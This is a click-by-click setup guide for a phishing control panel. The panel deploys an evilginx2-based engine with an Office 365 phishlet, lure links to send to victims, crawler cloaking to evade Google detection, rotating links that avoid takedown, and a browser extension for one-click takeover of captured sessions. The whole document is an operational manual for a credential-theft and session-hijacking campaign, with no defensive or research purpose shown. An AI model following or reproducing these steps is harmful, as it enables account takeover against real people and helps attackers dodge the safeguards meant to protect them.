# Control Panel - first-time setup guide

This is the plain-language, click-by-click version. The Control Panel runs on
**your computer**; it connects over SSH to a **VPS** and installs/manages the
evil-pro engine there. Nothing on the engine side is done by hand.

Total time: about 15 minutes once DNS is ready.

---

## 0. The short version

1. Buy a VPS, point two DNS records at it.
2. Start the panel (`START.bat`), set a password.
3. Add server -> fill it in -> Test connection.
4. Install.
5. Copy the lure link and send it.

Everything below is the detail for those five lines.

---

## 1. Before you start - checklist

Have all of this ready, or you will hit a wall:

- [ ] **A VPS**: Ubuntu 20.04-24.04 or Debian, 64-bit (`amd64` or `arm64`).
      1 vCPU / 1 GB RAM is enough. Fresh is best.
- [ ] **root** login over SSH (root password, or an SSH key file).
- [ ] **Ports open: 22, 80, 443, 5000.**
      Open them in **both** places:
      1. the VPS firewall (the installer also opens these in `ufw`), and
      2. your **provider's** firewall / security-group panel.
      Port 5000 is how the panel manages the engine - without it the panel is blind.
- [ ] **A domain you control** and access to its DNS.
- [ ] This computer. Nothing to install - the panel is a single file.

### Do the DNS first (important)

The engine gets HTTPS certificates as soon as it starts, so DNS must already
point at the VPS **before** you install:

| Type | Name        | Value     |
|------|-------------|-----------|
| A    | `@`         | `<VPS IP>` |
| A    | `*`         | `<VPS IP>` |

The wildcard (`*`) covers every subdomain the engine uses, so you never add them
one by one. Check it has propagated:

```
dig +short yourdomain.com
dig +short test.yourdomain.com
```

Both must print your VPS IP. If they don't, wait and retry - a certificate can't
be issued until they do.

> If your DNS is on Cloudflare you can skip the two rows above **only if** you
> add a Cloudflare token (step 5) - the panel will create the records for you.

---

## 2. Start the panel

**Windows:** double-click **START.bat**.
**Linux / macOS:**
```bash
chmod +x START.sh SETUP.sh evilpro-panel-linux   # or evilpro-panel-mac
./START.sh
```

First run asks three things:

| Prompt           | What to enter |
|------------------|---------------|
| Listen address   | press **Enter** for `127.0.0.1:8080` (only this computer can reach the panel - the safe default) |
| Login username   | `admin` |
| Login password   | **set one** (empty = no password at all) |

Your browser opens the panel. To change the login or port later, run
**SETUP.bat** again, or use **Settings -> Panel login & port** inside the panel.

---

## 3. Add your server

Click **+ Add server** and fill in the **Connection** tab:

- **Name** - anything, e.g. `prod-1`
- **Host / IP** - your VPS IP
- **SSH port** - `22`
- **User** - `root`
- **Auth** - `Password` (or `SSH key file` + the key path)
- **Password** - the root password

Then the **Deployment** tab:

- **Base domain** - `yourdomain.com` (a wildcard `*.yourdomain.com` must point at the server)
- **Install directory** - `/root/evilginx2` (default is fine)
- **Phishlet** - `o365new`
- **Dashboard subdomain** - `panel`
- **Dashboard user** - `admin`
- **Dashboard password** - leave empty, it is generated on install
- **Verbose logging** - only if you are debugging

Click **Save**, then **Test connection**. The first connection shows the server's
host fingerprint - accept it (it is pinned from then on, so a changed key is
flagged later).

---

## 4. Install

Click **Install** on the server row. In the window:

- **Harden host (ufw, free port 53)** - leave ON
- **Overwrite config.json (fresh install)** - ON for a first install
- **Create DNS records via Cloudflare** - only if you added a token (step 5)
- **Issue wildcard certificate (DNS-01)** - only with a Cloudflare token
- **Write Telegram credentials** - only if you use Telegram

Click **Install now** and watch the log. The panel SSHes in, installs packages
and the engine, writes the config, opens the firewall, sets up the service and
verifies it. At the end you get your **lure URL** - that is the link you send.

If the cert step fails, it is almost always DNS (step 1) or port 80 being closed.

---

## 5. Optional - let Cloudflare do DNS + certificates

Do this if your DNS is on Cloudflare and you want the panel to create the records
and issue a wildcard cert (DNS-01) instead of the built-in HTTP cert flow.

1. Add `yourdomain.com` to Cloudflare **first**.
2. Create an API token with:
   - **Zone -> DNS -> Edit**
   - **Zone -> Zone -> Read**
   - (only if you want the workers.dev **front link**: **Account -> Workers Scripts -> Edit** + **Read**)
3. In the server's **Cloudflare** tab: paste the token, tick
   **Issue wildcard cert**, click **Verify token**.
4. In the install window, tick **Create DNS records via Cloudflare** and
   **Issue wildcard certificate**.

Everything else in this guide works without Cloudflare.

---

## 6. Make the phish yours

Click the server, then **Manage**. The tabs are:

- **Sessions** - who has landed, and what was captured.
- **Phishlets** - turn `o365new` on/off, edit hosts.
- **Lures** - your phishing link(s). Edit the path or hostname, or create more;
  copy a finished link with **get-url**.
- **Redirects** - branded pre-login landing pages, with optional **Turnstile**
  and a delay. Each new page becomes its own subdomain. Optional: switch a page's
  **front** on to serve its link from `*.workers.dev` instead.
- **Autolures** - one shareable gateway URL whose path rotates, so the link can
  never be burned; share only the gateway.
- **Blacklist** - leave it on **Block unauth only**. This bounces crawlers to the
  real login so Google stays happy while victims still see the phish.
- **Settings** - base domain, `unauth_url`, force login, login prompt, etc.
- **Logs** - the live engine log.

Before mailing a campaign, open **Redirects -> Pre-flight (what a crawler sees)**
(or run `preflight` on the server). It proves every entry point sends crawlers
off your domain and keeps browsers on the phish.

---

## 7. Hand off to the victim-viewer

Click **Hand-off** on the server row. It gives you:

- the **Dashboard** link + login, and
- the **extension** folder to send alongside it.

The Dashboard shows **sessions only** - that is all the end user needs. To let
them take over a session in one click, load the extension once:

`chrome://extensions` -> **Developer mode** -> **Load unpacked** -> pick the
`extension` folder. (Firefox: `about:debugging` -> Load Temporary Add-on.)
Take-over can open in a normal window, a private window (separate cookie jar),
the current tab, or a real **own profile** (one-off `extension\host\install.bat`).

---

## 8. Day-2

- **Update** - re-uploads the engine binary from this computer and restarts.
- **Repair config** - rewrites the server config if you broke it.
- **Uninstall engine** - stops and disables it (config is kept).
- **Jobs / Logs** - what the panel is running right now.

---

## 9. Troubleshooting

| Symptom | Fix |
|---|---|
| Certificate fails | DNS `A`/`*` not pointing at the VPS yet, or port 80 closed. `dig` it, open 80, retry. |
| Can't connect over SSH | Wrong password/port, or the provider firewall blocks 22. |
| Panel shows the server as unreachable | Port 5000 blocked from your computer to the VPS. Open it. |
| Panel port already in use | START moves to the next free port and prints it. |
| Google says "Deceptive pages" | Normal for a young domain serving a Microsoft login. Keep blacklist on `unauth` and run **Pre-flight** before mailing; file a review in Search Console. |
| Phishlet hosts missing DNS | The wildcard `*` record is the fix - one record covers them all. |
| Anything else | Check the **Logs** tab, then the install job log. |

---

## 10. Golden rules

- **DNS before install.** Certs start immediately.
- **Open ports in the provider too**, not just ufw.
- **Set a panel password.**
- **Keep `panel.json`** (it holds server passwords) and the `extension/` folder safe.
- **Run Pre-flight before every campaign.**
